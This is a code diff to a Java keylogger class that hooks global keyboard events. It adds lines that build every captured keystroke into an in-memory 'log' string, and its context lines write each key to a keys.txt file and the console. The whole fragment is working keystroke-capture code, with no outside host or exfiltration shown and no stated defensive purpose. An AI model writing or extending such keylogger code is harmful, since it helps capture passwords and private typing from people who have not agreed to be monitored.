@@ -19,7 +19,7 @@ public class KeyLogger implements NativeKeyListener {
 
     private static final Path file = Paths.get("src/main/java/ch/fxlogger/fxkeylogger/keys.txt");
 
-    private static String s = "";
+    private static String log = "";
     private boolean st, ctrl, alt, capslock;
 
     public void run() {
@@ -42,9 +42,11 @@ public class KeyLogger implements NativeKeyListener {
         String keyText = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
         try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
             if (keyText.length() > 1) {
+                log = log + "[" + keyText + "]";
                 writer.print("[" + keyText + "]");
                 System.out.println("[" + keyText + "]");
             } else {
+                log = log + keyText;
                 writer.print(keyText);
                 System.out.println(keyText);
             }
